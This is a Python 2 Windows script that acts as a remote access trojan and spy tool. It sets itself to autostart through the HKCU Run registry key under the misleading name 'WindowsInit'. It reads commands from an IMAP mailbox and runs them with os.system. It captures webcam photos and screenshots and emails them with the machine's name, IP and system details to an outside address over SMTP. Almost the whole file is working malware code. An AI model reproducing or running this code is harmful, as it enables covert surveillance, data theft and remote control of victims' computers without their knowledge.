#!/usr/bin/env python
# -*- coding:utf-8 -*-
import sys
import imaplib
import smtplib
import os
import time
#import random
import email,mimetypes
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import thread
import threading
import socket
import uuid
import shutil
import platform
import win32api,win32con
from VideoCapture import Device
from ImageGrab import grab
#import PIL
#import base64
flag_photo=True
cp_path='D:\\Program Files\\mailphoto'
computer_name=socket.gethostname()
info=computer_name+' '+uuid.uuid1().hex[-12:]
computer_ip=socket.gethostbyname(computer_name)
my_contents="computer: "+computer_name+'\nip: '+computer_ip
my_contents=my_contents+'\n'+str(platform.architecture())+'\n'+platform.machine()+ \
          '\n'+platform.node()+'\n'+platform.platform()+'\n'+platform.processor()+ \
          '\n'+platform.system()+'\n'+platform.version()+'\n'+str(platform.uname())
def addfile2autorun(path):
     "注册到启动项"
     runpath = "Software\Microsoft\Windows\CurrentVersion\Run"
     hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_SET_VALUE)
     (filepath, filename) = os.path.split(path)
     win32api.RegSetValueEx(hKey, "WindowsInit", 0, win32con.REG_SZ, path)
     win32api.RegCloseKey(hKey)
def get_mail(host='imap.yeah.net',user='username',passwd='password'):
     global info
     global flag_photo
     re_cmd='cmd '+info
     re_contral='contral '+info
     while True:
          try:
               M=imaplib.IMAP4(host)
               M.login(user,passwd)
               M.select()
               while True:
                    typ,data=M.search(None,'UNSEEN')
                    #print(typ,data)
                    for num in data[0].split():
                         print num
                         ttyp,ddata=M.fetch(num,'(RFC822)')
                         M.store(num,'-FLAGS','\\seen')
                         for res in ddata:
                              if isinstance(res,tuple):
                                   msg=email.message_from_string(res[1])
                              else:
                                   continue
                              #print(msg['Subject'])
                              if msg['Subject']==re_cmd or msg['Subject']==re_contral:
                                   M.store(num,'+FLAGS','\\seen')
                                   for part in msg.walk():
                                        contenttype=part.get_content_type()
                                        if contenttype=='text/plain':
                                             try:
                                                  if msg['Subject']==re_cmd:
                                                       os.system(part.get_payload())
                                                  elif msg['Subject']==re_contral and part.get_payload()=='photo':
                                                       flag_photo=True
                                                  elif msg['Subject']==re_contral and part.get_payload()=='wingrab':
                                                       send_mail_2()
                                                  else:
                                                       pass
                                             except:
                                                  pass
                    time.sleep(5)
          except:
               try:
                    M.close()
                    M.logout()
               except:
                    pass
          finally:
               time.sleep(10)
def send_mail_2():
     global cp_path
     while True:
          try:
               img=grab()
               img.save(os.path.join(cp_path,'image.jpg'))
          except:
               time.sleep(2)
          else:
               break
     send_mail()
class s_mail():
     def run(self):
          global flag_photo
          global cp_path
          #cam=Device()
          while True:
               if flag_photo:
                    try:
                         cam=Device()
                         time.sleep(1)
                         myphoto=os.path.join(cp_path,'image.jpg')
                         cam.saveSnapshot(myphoto)
                    except:
                         try:
                              del cam
                         except:
                              pass
                    else:
                         del cam
                    finally:
                         send_mail()
                         flag_photo=False
               time.sleep(5)
def send_mail(cmds=None,host='smtp.yeah.net',fromaddr='xxx@yeah.net',
              toaddr='yyy@yeah.net',user='username2',passwd='password'):
    global my_contents
    global info
    global cp_path
    msg=MIMEMultipart()
    msg['From']=fromaddr
    msg['To']=toaddr
    while True:
        try:
            msg['Subject']=info
            contents=my_contents
            msg.attach(MIMEText(contents))
            #fileName='imageformats/image.jpg'
            fileName=os.path.join(cp_path,'image.jpg')
            if not os.path.isfile(fileName):
                break
            ctype,encoding=mimetypes.guess_type(fileName)
            if ctype is None or encoding is not None:
                ctype='application/octet-stream'
            maintype,subtype=ctype.split('/',1)
            maintype, subtype = ctype.split('/', 1)
            att1 = MIMEImage((lambda f: (f.read(), f.close()))(open(fileName, 'rb'))[0], _subtype = subtype)
            att1.add_header('Content-Disposition', 'attachment', filename = fileName)
            msg.attach(att1)
            #print(contents)
        except:
            time.sleep(3)
            pass
        else:
            break
    while True:
        try:
            server=smtplib.SMTP(host)
            #print('ok')
            server.login(user,passwd)
            server.sendmail(fromaddr,toaddr,msg.as_string())
        except:
            #print('err')
            time.sleep(3)
            try:
                server.quit()
            except:
                pass
        else:
            #print('quit ok')
            server.quit()
            try:
                os.remove(fileName)
            except:
                pass
            break
if __name__ == '__main__':
     path = os.path.abspath(sys.argv[0])
     addfile2autorun(path)
     if not os.path.isdir(cp_path):
          os.mkdir(cp_path)
          shutil.copyfile("helvB08.pil",os.path.join(cp_path,"helvB08.pil"))
          shutil.copyfile("helvB08.png",os.path.join(cp_path,"helvB08.png"))
          shutil.copyfile("helvetica-10.pil",os.path.join(cp_path,"helvetica-10.pil"))
          shutil.copyfile("helvetica-10.png",os.path.join(cp_path,"helvetica-10.png"))
     #get_mail()
     time.sleep(30)
     thread.start_new_thread(get_mail,())
     cam=s_mail()
     cam.run()   
